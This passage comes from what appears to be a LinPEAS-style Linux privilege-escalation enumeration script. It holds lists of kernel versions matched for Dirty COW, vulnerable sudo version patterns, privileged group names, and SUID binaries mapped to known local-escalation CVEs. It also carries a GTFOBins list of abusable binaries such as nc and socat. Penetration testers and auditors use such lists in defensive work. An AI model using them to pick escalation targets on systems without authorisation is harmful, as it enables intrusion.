1.6.el5|2.6.18-92.1.10.el5|2.6.18-92.1.13.el5|2.6.18-92.1.18.el5|2.6.18-92.1.22.el5|2.6.18-92.1.24.el5|2.6.18-92.1.26.el5|2.6.18-92.1.27.el5|2.6.18-92.1.28.el5|2.6.18-92.1.29.el5|2.6.18-92.1.32.el5|2.6.18-92.1.35.el5|2.6.18-92.1.38.el5|2.6.18-128.el5|2.6.18-128.1.1.el5|2.6.18-128.1.6.el5|2.6.18-128.1.10.el5|2.6.18-128.1.14.el5|2.6.18-128.1.16.el5|2.6.18-128.2.1.el5|2.6.18-128.4.1.el5|2.6.18-128.4.1.el5|2.6.18-128.7.1.el5|2.6.18-128.8.1.el5|2.6.18-128.11.1.el5|2.6.18-128.12.1.el5|2.6.18-128.14.1.el5|2.6.18-128.16.1.el5|2.6.18-128.17.1.el5|2.6.18-128.18.1.el5|2.6.18-128.23.1.el5|2.6.18-128.23.2.el5|2.6.18-128.25.1.el5|2.6.18-128.26.1.el5|2.6.18-128.27.1.el5"
kernelDCW_Rhel5_2="2.6.18-128.29.1.el5|2.6.18-128.30.1.el5|2.6.18-128.31.1.el5|2.6.18-128.32.1.el5|2.6.18-128.35.1.el5|2.6.18-128.36.1.el5|2.6.18-128.37.1.el5|2.6.18-128.38.1.el5|2.6.18-128.39.1.el5|2.6.18-128.40.1.el5|2.6.18-128.41.1.el5|2.6.18-164.el5|2.6.18-164.2.1.el5|2.6.18-164.6.1.el5|2.6.18-164.9.1.el5|2.6.18-164.10.1.el5|2.6.18-164.11.1.el5|2.6.18-164.15.1.el5|2.6.18-164.17.1.el5|2.6.18-164.19.1.el5|2.6.18-164.21.1.el5|2.6.18-164.25.1.el5|2.6.18-164.25.2.el5|2.6.18-164.28.1.el5|2.6.18-164.30.1.el5|2.6.18-164.32.1.el5|2.6.18-164.34.1.el5|2.6.18-164.36.1.el5|2.6.18-164.37.1.el5|2.6.18-164.38.1.el5|2.6.18-194.el5|2.6.18-194.3.1.el5|2.6.18-194.8.1.el5|2.6.18-194.11.1.el5|2.6.18-194.11.3.el5|2.6.18-194.11.4.el5|2.6.18-194.17.1.el5|2.6.18-194.17.4.el5|2.6.18-194.26.1.el5|2.6.18-194.32.1.el5|2.6.18-238.el5|2.6.18-238.1.1.el5|2.6.18-238.5.1.el5|2.6.18-238.9.1.el5|2.6.18-238.12.1.el5|2.6.18-238.19.1.el5|2.6.18-238.21.1.el5|2.6.18-238.27.1.el5|2.6.18-238.28.1.el5|2.6.18-238.31.1.el5|2.6.18-238.33.1.el5|2.6.18-238.35.1.el5|2.6.18-238.37.1.el5|2.6.18-238.39.1.el5|2.6.18-238.40.1.el5|2.6.18-238.44.1.el5|2.6.18-238.45.1.el5|2.6.18-238.47.1.el5|2.6.18-238.48.1.el5|2.6.18-238.49.1.el5|2.6.18-238.50.1.el5|2.6.18-238.51.1.el5|2.6.18-238.52.1.el5|2.6.18-238.53.1.el5|2.6.18-238.54.1.el5|2.6.18-238.55.1.el5|2.6.18-238.56.1.el5|2.6.18-274.el5|2.6.18-274.3.1.el5|2.6.18-274.7.1.el5|2.6.18-274.12.1.el5"
kernelDCW_Rhel5_3="2.6.18-274.17.1.el5|2.6.18-274.18.1.el5|2.6.18-308.el5|2.6.18-308.1.1.el5|2.6.18-308.4.1.el5|2.6.18-308.8.1.el5|2.6.18-308.8.2.el5|2.6.18-308.11.1.el5|2.6.18-308.13.1.el5|2.6.18-308.16.1.el5|2.6.18-308.20.1.el5|2.6.18-308.24.1.el5|2.6.18-348.el5|2.6.18-348.1.1.el5|2.6.18-348.2.1.el5|2.6.18-348.3.1.el5|2.6.18-348.4.1.el5|2.6.18-348.6.1.el5|2.6.18-348.12.1.el5|2.6.18-348.16.1.el5|2.6.18-348.18.1.el5|2.6.18-348.19.1.el5|2.6.18-348.21.1.el5|2.6.18-348.22.1.el5|2.6.18-348.23.1.el5|2.6.18-348.25.1.el5|2.6.18-348.27.1.el5|2.6.18-348.28.1.el5|2.6.18-348.29.1.el5|2.6.18-348.30.1.el5|2.6.18-348.31.2.el5|2.6.18-371.el5|2.6.18-371.1.2.el5|2.6.18-371.3.1.el5|2.6.18-371.4.1.el5|2.6.18-371.6.1.el5|2.6.18-371.8.1.el5|2.6.18-371.9.1.el5|2.6.18-371.11.1.el5|2.6.18-371.12.1.el5|2.6.18-398.el5|2.6.18-400.el5|2.6.18-400.1.1.el5|2.6.18-402.el5|2.6.18-404.el5|2.6.18-406.el5|2.6.18-407.el5|2.6.18-408.el5|2.6.18-409.el5|2.6.18-410.el5|2.6.18-411.el5|2.6.18-412.el5"
kernelDCW_Rhel6_1="2.6.33.9-rt31.66.el6rt|2.6.33.9-rt31.74.el6rt|2.6.33.9-rt31.75.el6rt|2.6.33.9-rt31.79.el6rt|3.0.9-rt26.45.el6rt|3.0.9-rt26.46.el6rt|3.0.18-rt34.53.el6rt|3.0.25-rt44.57.el6rt|3.0.30-rt50.62.el6rt|3.0.36-rt57.66.el6rt|3.2.23-rt37.56.el6rt|3.2.33-rt50.66.el6rt|3.6.11-rt28.20.el6rt|3.6.11-rt30.25.el6rt|3.6.11.2-rt33.39.el6rt|3.6.11.5-rt37.55.el6rt|3.8.13-rt14.20.el6rt|3.8.13-rt14.25.el6rt|3.8.13-rt27.33.el6rt|3.8.13-rt27.34.el6rt|3.8.13-rt27.40.el6rt|3.10.0-229.rt56.144.el6rt|3.10.0-229.rt56.147.el6rt|3.10.0-229.rt56.149.el6rt|3.10.0-229.rt56.151.el6rt|3.10.0-229.rt56.153.el6rt|3.10.0-229.rt56.158.el6rt|3.10.0-229.rt56.161.el6rt|3.10.0-229.rt56.162.el6rt|3.10.0-327.rt56.170.el6rt|3.10.0-327.rt56.171.el6rt|3.10.0-327.rt56.176.el6rt|3.10.0-327.rt56.183.el6rt|3.10.0-327.rt56.190.el6rt|3.10.0-327.rt56.194.el6rt|3.10.0-327.rt56.195.el6rt|3.10.0-327.rt56.197.el6rt|3.10.33-rt32.33.el6rt|3.10.33-rt32.34.el6rt|3.10.33-rt32.43.el6rt|3.10.33-rt32.45.el6rt|3.10.33-rt32.51.el6rt|3.10.33-rt32.52.el6rt|3.10.58-rt62.58.el6rt|3.10.58-rt62.60.el6rt|2.6.32-71.7.1.el6|2.6.32-71.14.1.el6|2.6.32-71.18.1.el6|2.6.32-71.18.2.el6|2.6.32-71.24.1.el6|2.6.32-71.29.1.el6|2.6.32-71.31.1.el6|2.6.32-71.34.1.el6|2.6.32-71.35.1.el6|2.6.32-71.36.1.el6|2.6.32-71.37.1.el6|2.6.32-71.38.1.el6|2.6.32-71.39.1.el6|2.6.32-71.40.1.el6|2.6.32-131.0.15.el6|2.6.32-131.2.1.el6|2.6.32-131.4.1.el6|2.6.32-131.6.1.el6|2.6.32-131.12.1.el6"
kernelDCW_Rhel6_2="2.6.32-131.17.1.el6|2.6.32-131.21.1.el6|2.6.32-131.22.1.el6|2.6.32-131.25.1.el6|2.6.32-131.26.1.el6|2.6.32-131.28.1.el6|2.6.32-131.29.1.el6|2.6.32-131.30.1.el6|2.6.32-131.30.2.el6|2.6.32-131.33.1.el6|2.6.32-131.35.1.el6|2.6.32-131.36.1.el6|2.6.32-131.37.1.el6|2.6.32-131.38.1.el6|2.6.32-131.39.1.el6|2.6.32-220.el6|2.6.32-220.2.1.el6|2.6.32-220.4.1.el6|2.6.32-220.4.2.el6|2.6.32-220.4.7.bgq.el6|2.6.32-220.7.1.el6|2.6.32-220.7.3.p7ih.el6|2.6.32-220.7.4.p7ih.el6|2.6.32-220.7.6.p7ih.el6|2.6.32-220.7.7.p7ih.el6|2.6.32-220.13.1.el6|2.6.32-220.17.1.el6|2.6.32-220.23.1.el6|2.6.32-220.24.1.el6|2.6.32-220.25.1.el6|2.6.32-220.26.1.el6|2.6.32-220.28.1.el6|2.6.32-220.30.1.el6|2.6.32-220.31.1.el6|2.6.32-220.32.1.el6|2.6.32-220.34.1.el6|2.6.32-220.34.2.el6|2.6.32-220.38.1.el6|2.6.32-220.39.1.el6|2.6.32-220.41.1.el6|2.6.32-220.42.1.el6|2.6.32-220.45.1.el6|2.6.32-220.46.1.el6|2.6.32-220.48.1.el6|2.6.32-220.51.1.el6|2.6.32-220.52.1.el6|2.6.32-220.53.1.el6|2.6.32-220.54.1.el6|2.6.32-220.55.1.el6|2.6.32-220.56.1.el6|2.6.32-220.57.1.el6|2.6.32-220.58.1.el6|2.6.32-220.60.2.el6|2.6.32-220.62.1.el6|2.6.32-220.63.2.el6|2.6.32-220.64.1.el6|2.6.32-220.65.1.el6|2.6.32-220.66.1.el6|2.6.32-220.67.1.el6|2.6.32-279.el6|2.6.32-279.1.1.el6|2.6.32-279.2.1.el6|2.6.32-279.5.1.el6|2.6.32-279.5.2.el6|2.6.32-279.9.1.el6|2.6.32-279.11.1.el6|2.6.32-279.14.1.bgq.el6|2.6.32-279.14.1.el6|2.6.32-279.19.1.el6|2.6.32-279.22.1.el6|2.6.32-279.23.1.el6|2.6.32-279.25.1.el6|2.6.32-279.25.2.el6|2.6.32-279.31.1.el6|2.6.32-279.33.1.el6|2.6.32-279.34.1.el6|2.6.32-279.37.2.el6|2.6.32-279.39.1.el6"
kernelDCW_Rhel6_3="2.6.32-279.41.1.el6|2.6.32-279.42.1.el6|2.6.32-279.43.1.el6|2.6.32-279.43.2.el6|2.6.32-279.46.1.el6|2.6.32-358.el6|2.6.32-358.0.1.el6|2.6.32-358.2.1.el6|2.6.32-358.6.1.el6|2.6.32-358.6.2.el6|2.6.32-358.6.3.p7ih.el6|2.6.32-358.11.1.bgq.el6|2.6.32-358.11.1.el6|2.6.32-358.14.1.el6|2.6.32-358.18.1.el6|2.6.32-358.23.2.el6|2.6.32-358.28.1.el6|2.6.32-358.32.3.el6|2.6.32-358.37.1.el6|2.6.32-358.41.1.el6|2.6.32-358.44.1.el6|2.6.32-358.46.1.el6|2.6.32-358.46.2.el6|2.6.32-358.48.1.el6|2.6.32-358.49.1.el6|2.6.32-358.51.1.el6|2.6.32-358.51.2.el6|2.6.32-358.55.1.el6|2.6.32-358.56.1.el6|2.6.32-358.59.1.el6|2.6.32-358.61.1.el6|2.6.32-358.62.1.el6|2.6.32-358.65.1.el6|2.6.32-358.67.1.el6|2.6.32-358.68.1.el6|2.6.32-358.69.1.el6|2.6.32-358.70.1.el6|2.6.32-358.71.1.el6|2.6.32-358.72.1.el6|2.6.32-358.73.1.el6|2.6.32-358.111.1.openstack.el6|2.6.32-358.114.1.openstack.el6|2.6.32-358.118.1.openstack.el6|2.6.32-358.123.4.openstack.el6|2.6.32-431.el6|2.6.32-431.1.1.bgq.el6|2.6.32-431.1.2.el6|2.6.32-431.3.1.el6|2.6.32-431.5.1.el6|2.6.32-431.11.2.el6|2.6.32-431.17.1.el6|2.6.32-431.20.3.el6|2.6.32-431.20.5.el6|2.6.32-431.23.3.el6|2.6.32-431.29.2.el6|2.6.32-431.37.1.el6|2.6.32-431.40.1.el6|2.6.32-431.40.2.el6|2.6.32-431.46.2.el6|2.6.32-431.50.1.el6|2.6.32-431.53.2.el6|2.6.32-431.56.1.el6|2.6.32-431.59.1.el6|2.6.32-431.61.2.el6|2.6.32-431.64.1.el6|2.6.32-431.66.1.el6|2.6.32-431.68.1.el6|2.6.32-431.69.1.el6|2.6.32-431.70.1.el6"
kernelDCW_Rhel6_4="2.6.32-431.71.1.el6|2.6.32-431.72.1.el6|2.6.32-431.73.2.el6|2.6.32-431.74.1.el6|2.6.32-504.el6|2.6.32-504.1.3.el6|2.6.32-504.3.3.el6|2.6.32-504.8.1.el6|2.6.32-504.8.2.bgq.el6|2.6.32-504.12.2.el6|2.6.32-504.16.2.el6|2.6.32-504.23.4.el6|2.6.32-504.30.3.el6|2.6.32-504.30.5.p7ih.el6|2.6.32-504.33.2.el6|2.6.32-504.36.1.el6|2.6.32-504.38.1.el6|2.6.32-504.40.1.el6|2.6.32-504.43.1.el6|2.6.32-504.46.1.el6|2.6.32-504.49.1.el6|2.6.32-504.50.1.el6|2.6.32-504.51.1.el6|2.6.32-504.52.1.el6|2.6.32-573.el6|2.6.32-573.1.1.el6|2.6.32-573.3.1.el6|2.6.32-573.4.2.bgq.el6|2.6.32-573.7.1.el6|2.6.32-573.8.1.el6|2.6.32-573.12.1.el6|2.6.32-573.18.1.el6|2.6.32-573.22.1.el6|2.6.32-573.26.1.el6|2.6.32-573.30.1.el6|2.6.32-573.32.1.el6|2.6.32-573.34.1.el6|2.6.32-642.el6|2.6.32-642.1.1.el6|2.6.32-642.3.1.el6|2.6.32-642.4.2.el6|2.6.32-642.6.1.el6"
kernelDCW_Rhel7="3.10.0-229.rt56.141.el7|3.10.0-229.1.2.rt56.141.2.el7_1|3.10.0-229.4.2.rt56.141.6.el7_1|3.10.0-229.7.2.rt56.141.6.el7_1|3.10.0-229.11.1.rt56.141.11.el7_1|3.10.0-229.14.1.rt56.141.13.el7_1|3.10.0-229.20.1.rt56.141.14.el7_1|3.10.0-229.rt56.141.el7|3.10.0-327.rt56.204.el7|3.10.0-327.4.5.rt56.206.el7_2|3.10.0-327.10.1.rt56.211.el7_2|3.10.0-327.13.1.rt56.216.el7_2|3.10.0-327.18.2.rt56.223.el7_2|3.10.0-327.22.2.rt56.230.el7_2|3.10.0-327.28.2.rt56.234.el7_2|3.10.0-327.28.3.rt56.235.el7|3.10.0-327.36.1.rt56.237.el7|3.10.0-123.el7|3.10.0-123.1.2.el7|3.10.0-123.4.2.el7|3.10.0-123.4.4.el7|3.10.0-123.6.3.el7|3.10.0-123.8.1.el7|3.10.0-123.9.2.el7|3.10.0-123.9.3.el7|3.10.0-123.13.1.el7|3.10.0-123.13.2.el7|3.10.0-123.20.1.el7|3.10.0-229.el7|3.10.0-229.1.2.el7|3.10.0-229.4.2.el7|3.10.0-229.7.2.el7|3.10.0-229.11.1.el7|3.10.0-229.14.1.el7|3.10.0-229.20.1.el7|3.10.0-229.24.2.el7|3.10.0-229.26.2.el7|3.10.0-229.28.1.el7|3.10.0-229.30.1.el7|3.10.0-229.34.1.el7|3.10.0-229.38.1.el7|3.10.0-229.40.1.el7|3.10.0-229.42.1.el7|3.10.0-327.el7|3.10.0-327.3.1.el7|3.10.0-327.4.4.el7|3.10.0-327.4.5.el7|3.10.0-327.10.1.el7|3.10.0-327.13.1.el7|3.10.0-327.18.2.el7|3.10.0-327.22.2.el7|3.10.0-327.28.2.el7|3.10.0-327.28.3.el7|3.10.0-327.36.1.el7|3.10.0-327.36.2.el7|3.10.0-229.1.2.ael7b|3.10.0-229.4.2.ael7b|3.10.0-229.7.2.ael7b|3.10.0-229.11.1.ael7b|3.10.0-229.14.1.ael7b|3.10.0-229.20.1.ael7b|3.10.0-229.24.2.ael7b|3.10.0-229.26.2.ael7b|3.10.0-229.28.1.ael7b|3.10.0-229.30.1.ael7b|3.10.0-229.34.1.ael7b|3.10.0-229.38.1.ael7b|3.10.0-229.40.1.ael7b|3.10.0-229.42.1.ael7b|4.2.0-0.21.el7"


MyUID=$(id -u $(whoami))
if [ "$MyUID" ]; then myuid=$MyUID; elif [ $(id -u $(whoami) 2>/dev/null) ]; then myuid=$(id -u $(whoami) 2>/dev/null); elif [ "$(id 2>/dev/null | cut -d "=" -f 2 | cut -d "(" -f 1)" ]; then myuid=$(id 2>/dev/null | cut -d "=" -f 2 | cut -d "(" -f 1); fi
if [ $myuid -gt 2147483646 ]; then baduid="|$myuid"; fi
idB="euid|egid$baduid"
sudovB="[01].[012345678].[0-9]+|1.9.[01234]|1.9.5p1"

mounted=$( (cat /proc/self/mountinfo || cat /proc/1/mountinfo) 2>/dev/null | cut -d " " -f5 | grep "^/" | tr '\n' '|')$(cat /etc/fstab 2>/dev/null | grep -v "#" | grep -E '\W/\W' | awk '{print $1}')
if ! [ "$mounted" ]; then
  mounted=$( (mount -l || cat /proc/mounts || cat /proc/self/mounts || cat /proc/1/mounts) 2>/dev/null | grep "^/" | cut -d " " -f1 | tr '\n' '|')$(cat /etc/fstab 2>/dev/null | grep -v "#" | grep -E '\W/\W' | awk '{print $1}')
fi
if ! [ "$mounted" ]; then mounted="ImPoSSssSiBlEee"; fi # Don't let any blacklist to be empty
mountG="swap|/cdrom|/floppy|/dev/shm"
notmounted=$(cat /etc/fstab 2>/dev/null | grep "^/" | grep -Ev "$mountG" | awk '{print $1}' | grep -Ev "$mounted" | tr '\n' '|')"ImPoSSssSiBlEee"
mountpermsB="\Wsuid|\Wuser|\Wexec"
mountpermsG="nosuid|nouser|noexec"

rootcommon="/init$|upstart-udev-bridge|udev|/getty|cron|apache2|java|tomcat|/vmtoolsd|/VGAuthService"

groupsB="\(root\)|\(shadow\)|\(admin\)|\(video\)|\(adm\)|\(wheel\)|\(auth\)"
groupsVB="\(sudo\)|\(docker\)|\(lxd\)|\(disk\)|\(lxc\)"
knw_grps='\(lpadmin\)|\(cdrom\)|\(plugdev\)|\(nogroup\)' # https://www.togaware.com/linux/survivor/Standard_Groups.html
mygroups=$(groups 2>/dev/null | tr " " "|")

# Default Binaries List
sidG1="/abuild-sudo$|/accton$|/allocate$|/ARDAgent$|/arping$|/atq$|/atrm$|/authpf$|/authpf-noip$|/authopen$|/batch$|/bbsuid$|/bsd-write$|/btsockstat$|/bwrap$|/cacaocsc$|/camel-lock-helper-1.2$|/ccreds_validate$|/cdrw$|/chage$|/check-foreground-console$|/chrome-sandbox$|/chsh$|/cons.saver$|/crontab$|/ct$|/cu$|/dbus-daemon-launch-helper$|/deallocate$|/desktop-create-kmenu$|/dma$|/dma-mbox-create$|/dmcrypt-get-device$|/doas$|/dotlockfile$|/dotlock.mailutils$|/dtaction$|/dtfile$|/eject$|/execabrt-action-install-debuginfo-to-abrt-cache$|/execdbus-daemon-launch-helper$|/execdma-mbox-create$|/execlockspool$|/execlogin_chpass$|/execlogin_lchpass$|/execlogin_passwd$|/execssh-keysign$|/execulog-helper$|/exim4|/expiry$|/fdformat$|/fstat$|/fusermount$|/fusermount3$"
sidG2="/gnome-pty-helper$|/glines$|/gnibbles$|/gnobots2$|/gnome-suspend$|/gnometris$|/gnomine$|/gnotski$|/gnotravex$|/gpasswd$|/gpg$|/gpio$|/gtali|/.hal-mtab-lock$|/helper$|/imapd$|/inndstart$|/kismet_cap_nrf_51822$|/kismet_cap_nxp_kw41z$|/kismet_cap_ti_cc_2531$|/kismet_cap_ti_cc_2540$|/kismet_cap_ubertooth_one$|/kismet_capture$|/kismet_cap_linux_bluetooth$|/kismet_cap_linux_wifi$|/kismet_cap_nrf_mousejack$|/ksu$|/list_devices$|/load_osxfuse$|/locate$|/lock$|/lockdev$|/lockfile$|/login_activ$|/login_crypto$|/login_radius$|/login_skey$|/login_snk$|/login_token$|/login_yubikey$|/lpc$|/lpd$|/lpd-port$|/lppasswd$|/lpq$|/lpr$|/lprm$|/lpset$|/lxc-user-nic$|/mahjongg$|/mail-lock$|/mailq$|/mail-touchlock$|/mail-unlock$|/mksnap_ffs$|/mlocate$|/mlock$|/mount$|/mount.cifs$|/mount.ecryptfs_private$|/mount.nfs$|/mount.nfs4$|/mount_osxfuse$|/mtr$|/mutt_dotlock$"
sidG3="/ncsa_auth$|/netpr$|/netkit-rcp$|/netkit-rlogin$|/netkit-rsh$|/netreport$|/netstat$|/newgidmap$|/newtask$|/newuidmap$|/nvmmctl$|/opieinfo$|/opiepasswd$|/pam_auth$|/pam_extrausers_chkpwd$|/pam_timestamp_check$|/pamverifier$|/pfexec$|/ping$|/ping6$|/pmconfig$|/pmap$|/polkit-agent-helper-1$|/polkit-explicit-grant-helper$|/polkit-grant-helper$|/polkit-grant-helper-pam$|/polkit-read-auth-helper$|/polkit-resolve-exe-helper$|/polkit-revoke-helper$|/polkit-set-default-helper$|/postdrop$|/postqueue$|/poweroff$|/ppp$|/procmail$|/pstat$|/pt_chmod$|/pwdb_chkpwd$|/quota$|/rcmd|/remote.unknown$|/rlogin$|/rmformat$|/rnews$|/run-mailcap$|/sacadm$|/same-gnome$|screen.real$|/security_authtrampoline$|/sendmail.sendmail$|/shutdown$|/skeyaudit$|/skeyinfo$|/skeyinit$|/sliplogin|/slocate$|/smbmnt$|/smbumount$|/smpatch$|/smtpctl$|/sperl5.8.8$|/ssh-agent$|/ssh-keysign$|/staprun$|/startinnfeed$|/stclient$|/su$|/suexec$|/sys-suspend$|/sysstat$|/systat$"
sidG4="/telnetlogin$|/timedc$|/tip$|/top$|/traceroute6$|/traceroute6.iputils$|/trpt$|/tsoldtlabel$|/tsoljdslabel$|/tsolxagent$|/ufsdump$|/ufsrestore$|/ulog-helper$|/umount.cifs$|/umount.nfs$|/umount.nfs4$|/unix_chkpwd$|/uptime$|/userhelper$|/userisdnctl$|/usernetctl$|/utempter$|/utmp_update$|/uucico$|/uuglist$|/uuidd$|/uuname$|/uusched$|/uustat$|/uux$|/uuxqt$|/VBoxHeadless$|/VBoxNetAdpCtl$|/VBoxNetDHCP$|/VBoxNetNAT$|/VBoxSDL$|/VBoxVolInfo$|/VirtualBoxVM$|/vmstat$|/vmware-authd$|/vmware-user-suid-wrapper$|/vmware-vmx$|/vmware-vmx-debug$|/vmware-vmx-stats$|/vncserver-x11$|/volrmmount$|/w$|/wall$|/whodo$|/write$|/X$|/Xorg.wrap$|/Xsun$|/Xvnc$|/yppasswd$"

# Rules: Start path " /", end path "$", divide path and vulnversion "%". SPACE IS ONLY ALLOWED AT BEGINNING, DONT USE IT IN VULN DESCRIPTION
sidB="/apache2$%Read_root_passwd__apache2_-f_/etc/shadow\(CVE-2019-0211\)\
 /at$%RTru64_UNIX_4.0g\(CVE-2002-1614\)\
 /abrt-action-install-debuginfo-to-abrt-cache$%CENTOS 7.1/Fedora22
 /chfn$%SuSE_9.3/10\
 /chkey$%Solaris_2.5.1\
 /chkperm$%Solaris_7.0_\
 /chpass$%2Vulns:OpenBSD_6.1_to_OpenBSD 6.6\(CVE-2019-19726\)--OpenBSD_2.7_i386/OpenBSD_2.6_i386/OpenBSD_2.5_1999/08/06/OpenBSD_2.5_1998/05/28/FreeBSD_4.0-RELEASE/FreeBSD_3.5-RELEASE/FreeBSD_3.4-RELEASE/NetBSD_1.4.2\
 /chpasswd$%SquirrelMail\(2004-04\)\
 /dtappgather$%Solaris_7_<_11_\(SPARC/x86\)\(CVE-2017-3622\)\
 /dtprintinfo$%Solaris_10_\(x86\)_and_lower_versions_also_SunOS_5.7_to_5.10\
 /dtsession$%Oracle_Solaris_10_1/13_and_earlier\(CVE-2020-2696\)\
 /eject$%FreeBSD_mcweject_0.9/SGI_IRIX_6.2\
 /ibstat$%IBM_AIX_Version_6.1/7.1\(09-2013\)\
 /kcheckpass$%KDE_3.2.0_<-->_3.4.2_\(both_included\)\
 /kdesud$%KDE_1.1/1.1.1/1.1.2/1.2\
 /keybase-redirector%CentOS_Linux_release_7.4.1708\
 /login$%IBM_AIX_3.2.5/SGI_IRIX_6.4\
 /lpc$%S.u.S.E_Linux_5.2\
 /lpr$%BSD/OS2.1/FreeBSD2.1.5/NeXTstep4.x/IRIX6.4/SunOS4.1.3/4.1.4\(09-1996\)\
 /mail.local$%NetBSD_7.0-7.0.1__6.1-6.1.5__6.0-6.0.6
 /mount$%Apple_Mac_OSX\(Lion\)_Kernel_xnu-1699.32.7_except_xnu-1699.24.8\
 /movemail$%Emacs\(08-1986\)\
 /mrinfo$%NetBSD_Sep_17_2002_https://securitytracker.com/id/1005234\
 /mtrace$%NetBSD_Sep_17_2002_https://securitytracker.com/id/1005234\
 /netprint$%IRIX_5.3/6.2/6.3/6.4/6.5/6.5.11\
 /newgrp$%HP-UX_10.20\
 /ntfs-3g$%Debian9/8/7/Ubuntu/Gentoo/others/Ubuntu_Server_16.10_and_others\(02-2017\)\
 /passwd$%Apple_Mac_OSX\(03-2006\)/Solaris_8/9\(12-2004\)/SPARC_8/9/Sun_Solaris_2.3_to_2.5.1\(02-1997\)\
 /pkexec$%Linux4.10_to_5.1.17\(CVE-2019-13272\)/rhel_6\(CVE-2011-1485\)\
 /pppd$%Apple_Mac_OSX_10.4.8\(05-2007\)\
 /pt_chown$%GNU_glibc_2.1/2.1.1_-6\(08-1999\)\
 /pulseaudio$%\(Ubuntu_9.04/Slackware_12.2.0\)\
 /rcp$%RedHat_6.2\
 /rdist$%Solaris_10/OpenSolaris\
 /rsh$%Apple_Mac_OSX_10.9.5/10.10.5\(09-2015\)\
 /screen$%GNU_Screen_4.5.0\
 /sdtcm_convert$%Sun_Solaris_7.0\
 /sendmail$%Sendmail_8.10.1/Sendmail_8.11.x/Linux_Kernel_2.2.x_2.4.0-test1_\(SGI_ProPack_1.2/1.3\)\
 /snap-confine$%Ubuntu_snapd<2.37_dirty_sock_Local_Privilege_Escalation\(CVE-2019-7304\)\
 /sudo%check_if_the_sudo_version_is_vulnerable\
 /Serv-U%FTP_Server<15.1.7(CVE-2019-12181)
 /sudoedit$%Sudo/SudoEdit_1.6.9p21/1.7.2p4/\(RHEL_5/6/7/Ubuntu\)/Sudo<=1.8.14\
 /tmux$%Tmux_1.3_1.4_privesc\(CVE-2011-1496\)\
 /traceroute$%LBL_Traceroute_\[2000-11-15\]\
 /ubuntu-core-launcher$%Befre_1.0.27.1\(CVE-2016-1580\)\
 /umount$%BSD/Linux\(08-1996\)\
 /umount-loop$%Rocks_Clusters<=4.1\(07-2006\)\
 /uucp$%Taylor_UUCP_1.0.6\
 /XFree86$%XFree86_X11R6_3.3.x/4.0/4.x/3.3\(03-2003\)\
 /xlock$%BSD/OS_2.1/DG/UX_7.0/Debian_1.3/HP-UX_10.34/IBM_AIX_4.2/SGI_IRIX_6.4/Solaris_2.5.1\(04-1997\)\
 /xscreensaver%Solaris_11.x\(CVE-2019-3010\)\
 /xorg$%Xorg_1.19_to_1.20.x\(CVE_2018-14665\)/xorg-x11-server<=1.20.3/AIX_7.1_\(6.x_to_7.x_should_be_vulnerable\)_X11.base.rte<7.1.5.32_and_\
 /xterm$%Solaris_5.5.1_X11R6.3\(05-1997\)/Debian_xterm_version_222-1etch2\(01-2009\)"
# To update sidVB: curl https://github.com/GTFOBins/GTFOBins.github.io/tree/master/_gtfobins 2>/dev/null | grep 'href="/GTFOBins/' | grep '.md">' | awk -F 'title="' '{print $2}' | cut -d '"' -f1 | cut -d "." -f1 | sed  -e 's,^,/,' | sed  -e 's,$,\$,' | tr '\n' '|'
sidVB='/aa-exec$|/ab$|/agetty$|/alpine$|/ar$|/aria2c$|/arj$|/arp$|/as$|/ascii-xfr$|/ash$|/aspell$|/atobm$|/awk$|/base32$|/base64$|/basenc$|/basez$|/bash$|/batcat$|/bc$|/bridge$|/busybox$|/byebug$|/bzip2$|/cabal$|/capsh$|/cat$|/chmod$|/choom$|/chown$|/chroot$|/clamscan$|/cmp$|/column$|/comm$|/composer$|/cp$|/cpio$|/cpulimit$|/csh$|/csplit$|/csvtool$|/cupsfilter$|/curl$|/cut$|/dash$|/date$|/dd$|/debugfs$|/dialog$|/diff$|/dig$|/distcc$|/dmsetup$|/docker$|/dosbox$|/dvips$|/ed$|/efax$|/elvish$|/emacs$|/env$|/eqn$|/espeak$|/expand$|/expect$|/file$|/find$|/fish$|/flock$|/fmt$|/fold$|/gawk$|/gcore$|/gdb$|/genie$|/genisoimage$|/gimp$|/ginsh$|/git$|/grep$|/gtester$|/gzip$|/hd$|/head$|/hexdump$|/highlight$|/hping3$|/iconv$|/iftop$|/install$|/ionice$|/ip$|/ispell$|/jjs$|/joe$|/join$|/jq$|/jrunscript$|/julia$|/ksh$|/ksshell$|/kubectl$|/latex$|/ldconfig$|/less$|/lftp$|/logsave$|/look$|/lua$|/lualatex$|/luatex$|/make$|/mawk$|/more$|/mosquitto$|/msgattrib$|/msgcat$|/msgconv$|/msgfilter$|/msgmerge$|/msguniq$|/multitime$|/mv$'
sidVB2='/mysql$|/nano$|/nasm$|/nawk$|/nc$|/ncftp$|/nft$|/nice$|/nl$|/nm$|/nmap$|/node$|/nohup$|/octave$|/od$|/openssl$|/openvpn$|/pandoc$|/paste$|/pdflatex$|/pdftex$|/perf$|/perl$|/pexec$|/pg$|/php$|/pic$|/pico$|/pidstat$|/posh$|/pr$|/pry$|/psftp$|/ptx$|/python$|/rake$|/rc$|/readelf$|/restic$|/rev$|/rlwrap$|/rpm$|/rpmdb$|/rpmquery$|/rpmverify$|/rsync$|/rtorrent$|/run-parts$|/rview$|/rvim$|/sash$|/scanmem$|/scp$|/scrot$|/sed$|/setarch$|/setfacl$|/setlock$|/shuf$|/slsh$|/socat$|/soelim$|/softlimit$|/sort$|/sqlite3$|/ss$|/ssh-agent$|/ssh-keygen$|/ssh-keyscan$|/sshpass$|/start-stop-daemon$|/stdbuf$|/strace$|/strings$|/sysctl$|/systemctl$|/tac$|/tail$|/tar$|/taskset$|/tasksh$|/tbl$|/tclsh$|/tdbtool$|/tee$|/telnet$|/terraform$|/tex$|/tftp$|/tic$|/time$|/timeout$|/tmate$|/troff$|/ul$|/unexpand$|/uniq$|/unshare$|/unsquashfs$|/unzip$|/update-alternatives$|/uudecode$|/uuencode$|/vagrant$|/view$|/vigr$|/vim$|/vimdiff$|/vipw$|/w3m$|/watch$|/wc$|/wget$|/whiptail$|/xargs$|/xdotool$|/xelatex$|/xetex$|/xmodmap$|/xmore$|/xxd$|/xz$|/yash$|/zip$|/zsh$|/zsoelim$'
cfuncs='file|free|main|more|read|split|write'

